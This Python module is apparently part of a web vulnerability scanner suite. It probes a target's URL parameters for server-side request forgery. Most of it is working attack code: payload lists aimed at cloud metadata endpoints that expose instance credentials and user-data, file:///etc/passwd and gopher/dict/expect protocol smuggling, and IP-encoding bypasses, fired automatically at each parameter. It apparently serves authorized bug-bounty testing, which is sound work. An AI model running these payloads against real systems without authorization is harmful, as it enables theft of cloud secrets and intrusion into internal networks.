#!/usr/bin/env python3
"""
Module 6: SSRF Scanner
5 Layer SSRF detection | Waktu: 10-12 menit | Akurasi: 90%
Mendeteksi: Internal IP, Cloud metadata, Protocol smuggling, Bypass techniques

MODIFIED: Added external HTTPClient support for X-Bug-Bounty header
"""

import asyncio
import time
import re
from typing import List, Dict, Optional
from urllib.parse import urlparse, quote
from core.http_client import HTTPClient
from core.logger import Logger

logger = Logger()

class SSRFScanner:
    def __init__(self, target: str, threads: int = 50, timeout: int = 4, client: HTTPClient = None):
        self.target = target.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.client = client  # External client with X-Bug-Bounty header
        self.findings: List[Dict] = []
        self.stats = {
            'endpoints_tested': 0,
            'payloads_tested': 0,
            'vulnerabilities_found': 0
        }
        
        # ============ SSRF PARAMETERS ============
        self.ssrf_params = [
            'url', 'uri', 'link', 'src', 'dest', 'destination',
            'redirect', 'redirect_uri', 'return_to', 'next', 'goto',
            'callback', 'callback_url', 'webhook', 'file', 'path',
            'load', 'include', 'open', 'fetch', 'image_url', 'img_url',
            'proxy', 'api_url', 'endpoint', 'base_url', 'service_url',
            'metadata', 'instance_id', 'forward_url', 'target_url'
        ]
        
        # ============ INTERNAL ADDRESSES ============
        self.internal_addresses = [
            '127.0.0.1', 'localhost', '0.0.0.0',
            '10.0.0.1', '172.16.0.1', '192.168.1.1',
            '169.254.169.254',  # AWS metadata
            'metadata.google.internal',  # GCP metadata
            '168.63.129.16',  # Azure metadata
            '127.0.0.1:2375'  # Docker
        ]
        
        # ============ CLOUD METADATA ============
        self.cloud_metadata = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/user-data/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://169.254.169.254/metadata/instance'
        ]
        
        # ============ PROTOCOL PAYLOADS ============
        self.protocol_payloads = [
            'file:///etc/passwd',
            'file:///c:/windows/win.ini',
            'dict://localhost:11211/info',
            'gopher://localhost:8080/_GET / HTTP/1.0%0A%0A',
            'expect://id'
        ]
        
        # ============ BYPASS PAYLOADS ============
        self.bypass_payloads = [
            'http://0',
            'http://127.0.0.1.nip.io',
            'http://0x7f000001',
            'http://2130706433',
            'http://[::1]',
            'http://127.1',
            'http://%31%32%37%2e%30%2e%30%2e%31',
            'http://user:pass@127.0.0.1'
        ]
        
        # ============ RESPONSE INDICATORS ============
        self.ssrf_indicators = [
            'root:', 'bin/bash', 'daemon:', 'ami-id', 
            'instance-id', 'meta-data', '[extensions]'
        ]
    
    async def _get_client(self):
        """Get HTTP client - use external if available, otherwise create new"""
        if self.client:
            return self.client
        else:
            return HTTPClient(self.target, timeout=self.timeout, retries=1)
    
    async def test_parameter(self, endpoint: str, param: str, payload: str) -> Optional[Dict]:
        """Test single parameter for SSRF"""
        client = await self._get_client()
        url = f"{endpoint}?{param}={quote(payload)}"
        
        try:
            start_time = time.perf_counter()
            
            if not hasattr(client, 'session') or client.session is None:
                async with client as ctx_client:
                    response = await ctx_client.get(url)
                    elapsed_ms = (time.perf_counter() - start_time) * 1000
                    
                    if response:
                        response_text = await response.text()
                        body = response_text.lower() if response_text else ""
                        
                        for indicator in self.ssrf_indicators:
                            if indicator in body:
                                if '169.254.169.254' in payload or 'metadata.google' in payload:
                                    severity = "critical"
                                    vuln_type = "CLOUD_METADATA_SSRF"
                                elif 'file://' in payload:
                                    severity = "critical"
                                    vuln_type = "FILE_PROTOCOL_SSRF"
                                else:
                                    severity = "high"
                                    vuln_type = "INTERNAL_SSRF"
                                
                                return {
                                    "vulnerable": True,
                                    "type": vuln_type,
                                    "severity": severity,
                                    "confidence": 95,
                                    "endpoint": endpoint,
                                    "parameter": param,
                                    "payload": payload[:80],
                                    "indicator": indicator,
                                    "response_time_ms": round(elapsed_ms, 2)
                                }
                        
                        if elapsed_ms > 1500:
                            return {
                                "vulnerable": True,
                                "type": "TIME_BASED_SSRF",
                                "severity": "medium",
                                "confidence": 60,
                                "endpoint": endpoint,
                                "parameter": param,
                                "payload": payload[:80],
                                "response_time_ms": round(elapsed_ms, 2)
                            }
            else:
                response = await client.get(url)
                elapsed_ms = (time.perf_counter() - start_time) * 1000
                
                if response:
                    response_text = await response.text()
                    body = response_text.lower() if response_text else ""
                    
                    for indicator in self.ssrf_indicators:
                        if indicator in body:
                            if '169.254.169.254' in payload or 'metadata.google' in payload:
                                severity = "critical"
                                vuln_type = "CLOUD_METADATA_SSRF"
                            elif 'file://' in payload:
                                severity = "critical"
                                vuln_type = "FILE_PROTOCOL_SSRF"
                            else:
                                severity = "high"
                                vuln_type = "INTERNAL_SSRF"
                            
                            return {
                                "vulnerable": True,
                                "type": vuln_type,
                                "severity": severity,
                                "confidence": 95,
                                "endpoint": endpoint,
                                "parameter": param,
                                "payload": payload[:80],
                                "indicator": indicator,
                                "response_time_ms": round(elapsed_ms, 2)
                            }
                    
                    if elapsed_ms > 1500:
                        return {
                            "vulnerable": True,
                            "type": "TIME_BASED_SSRF",
                            "severity": "medium",
                            "confidence": 60,
                            "endpoint": endpoint,
                            "parameter": param,
                            "payload": payload[:80],
                            "response_time_ms": round(elapsed_ms, 2)
                        }
        except:
            pass
        
        return None
    
    async def scan_endpoint(self, endpoint: str) -> List[Dict]:
        """Scan single endpoint - optimized"""
        
        findings = []
        semaphore = asyncio.Semaphore(self.threads)
        
        async def test_ssrf(param: str, payload: str):
            async with semaphore:
                result = await self.test_parameter(endpoint, param, payload)
                if result:
                    findings.append(result)
                    self.stats['vulnerabilities_found'] += 1
                    icon = "💎" if result.get('severity') == 'critical' else "🔴"
                    logger.info(f"{icon} SSRF on {endpoint} via {param}: {payload[:60]}")
                    return True
            return False
        
        for param in self.ssrf_params:
            found = False
            
            # Test cloud metadata (prioritas)
            for metadata in self.cloud_metadata:
                self.stats['payloads_tested'] += 1
                found = await test_ssrf(param, metadata)
                if found:
                    break
                await asyncio.sleep(0.01)
            
            if found:
                continue
            
            # Test internal IPs
            for ip in self.internal_addresses:
                self.stats['payloads_tested'] += 1
                found = await test_ssrf(param, f"http://{ip}")
                if found:
                    break
                await asyncio.sleep(0.01)
            
            if found:
                continue
            
            # Test file protocol
            for payload in self.protocol_payloads:
                self.stats['payloads_tested'] += 1
                found = await test_ssrf(param, payload)
                if found:
                    break
                await asyncio.sleep(0.01)
            
            if found:
                continue
            
            # Test bypass techniques
            for bypass in self.bypass_payloads:
                self.stats['payloads_tested'] += 1
                found = await test_ssrf(param, bypass)
                if found:
                    break
                await asyncio.sleep(0.01)
        
        return findings
    
    async def scan(self, custom_endpoints: List[str] = None) -> Dict:
        """Full SSRF scanner - BALANCED MODE"""
        
        if custom_endpoints:
            endpoints = custom_endpoints
        else:
            endpoints = ["/", "/api", "/v1", "/fetch", "/proxy", "/image", "/download"]
        
        total_tests = len(endpoints) * len(self.ssrf_params) * (
            len(self.cloud_metadata) + len(self.internal_addresses) + 
            len(self.protocol_payloads) + len(self.bypass_payloads)
        )
        
        logger.info(f"\n{'='*60}")
        logger.info(f"🚀 DRYBT SSRF SCANNER")
        logger.info(f"{'='*60}")
        logger.info(f"🎯 Target: {self.target}")
        logger.info(f"📡 Endpoints: {len(endpoints)}")
        logger.info(f"📊 Parameters: {len(self.ssrf_params)}")
        logger.info(f"📈 Total tests: {total_tests:,}")
        logger.info(f"🔧 Threads: {self.threads} | Timeout: {self.timeout}s")
        logger.info(f"⏱️  Estimated time: 10-12 minutes")
        logger.info(f"{'='*60}\n")
        
        start_time = time.time()
        
        for endpoint in endpoints:
            logger.info(f"\n📡 Testing: {endpoint}")
            findings = await self.scan_endpoint(endpoint)
            self.findings.extend(findings)
            self.stats['endpoints_tested'] += 1
            
            elapsed = time.time() - start_time
            logger.info(f"  ✅ Done: {endpoint} - {len(findings)} findings | {elapsed/60:.1f}m elapsed")
        
        elapsed = time.time() - start_time
        
        critical_findings = [f for f in self.findings if f.get('severity') == 'critical']
        high_findings = [f for f in self.findings if f.get('severity') == 'high']
        
        print(f"\n{'='*60}")
        print(f"📊 SSRF SCAN SUMMARY")
        print(f"{'='*60}")
        print(f"⏱️  Time: {elapsed:.2f}s ({elapsed/60:.1f}m)")
        print(f"📡 Endpoints: {self.stats['endpoints_tested']}")
        print(f"📊 Payloads: {self.stats['payloads_tested']}")
        print(f"🎯 Findings: {len(self.findings)}")
        
        if critical_findings:
            print(f"\n💎 CRITICAL VULNERABILITIES:")
            for f in critical_findings[:10]:
                print(f"   🔥 {f['type']} | {f.get('parameter')} | Confidence: {f.get('confidence', 0)}%")
        
        if high_findings:
            print(f"\n🔴 HIGH VULNERABILITIES:")
            for f in high_findings[:10]:
                print(f"   ⚡ {f['type']} | {f.get('parameter')} | Confidence: {f.get('confidence', 0)}%")
        
        print(f"\n{'='*60}")
        
        rating = "💎 CRITICAL - Cloud metadata accessible!" if critical_findings else \
                 "🔴 HIGH - Internal network SSRF possible" if high_findings else \
                 "✅ SECURE - No SSRF detected"
        
        print(f"📈 Result: {rating}")
        print(f"{'='*60}\n")
        
        return {
            "module": "ssrf_scanner",
            "mode": "balanced",
            "target": self.target,
            "scan_time_minutes": round(elapsed/60, 1),
            "endpoints_tested": self.stats['endpoints_tested'],
            "payloads_tested": self.stats['payloads_tested'],
            "vulnerabilities_found": len(self.findings),
            "critical_vulnerabilities": len(critical_findings),
            "high_vulnerabilities": len(high_findings),
            "findings": self.findings
        }


# ================================================================
# MAIN RUN FUNCTION - MODIFIED FOR EXTERNAL CLIENT
# ================================================================
async def run(target: str, custom_endpoints: List[str] = None, client: HTTPClient = None) -> Dict:
    """
    Run SSRF scanner - DRYBT SSRF SCANNER
    
    Args:
        target: Target URL
        custom_endpoints: Custom endpoints to test (optional)
        client: Optional external HTTPClient (for X-Bug-Bounty header)
    """
    scanner = SSRFScanner(target, client=client)
    return await scanner.scan(custom_endpoints)